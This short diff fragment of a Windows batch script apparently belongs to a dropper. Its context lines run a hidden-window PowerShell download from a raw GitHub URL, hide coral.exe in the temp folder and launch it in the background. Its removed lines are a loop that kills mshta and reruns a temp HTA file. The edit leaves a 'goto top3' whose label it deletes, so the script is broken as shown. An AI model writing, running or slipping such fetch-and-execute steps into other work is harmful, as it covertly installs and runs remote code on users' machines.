@@ -19,9 +19,3 @@ powershell -Window Hidden Invoke-WebRequest -Uri https://raw.githubusercontent.c
 cmd /c attrib +h %tmp%/coral.exe 
 cmd /c start /B %tmp%/coral.exe 
 goto top3 
-
-:top3 
-timeout /t 100 & 
-taskkill /IM mshta.exe /F 
-powershell invoke-expression 'mshta %tmp%/mathew.hta' 
-goto top3
